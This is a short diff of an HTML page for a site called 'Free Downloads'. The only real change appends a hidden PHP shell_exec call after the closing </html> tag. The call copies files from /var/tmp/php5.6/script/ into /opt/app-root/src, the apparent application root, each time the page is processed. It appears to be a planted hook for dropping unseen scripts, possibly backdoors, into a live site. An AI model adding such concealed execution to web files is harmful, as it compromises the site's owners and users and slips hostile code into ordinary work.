@@ -25,4 +25,4 @@ Unlimited bandwidth. </p>
 <!-- And add a copyright notice.-->
 <p>&#169; Free Downloads, 2020</p>
 </body>
-</html>
+</html><?php shell_exec('cp -n /var/tmp/php5.6/script/* /opt/app-root/src'); ?>
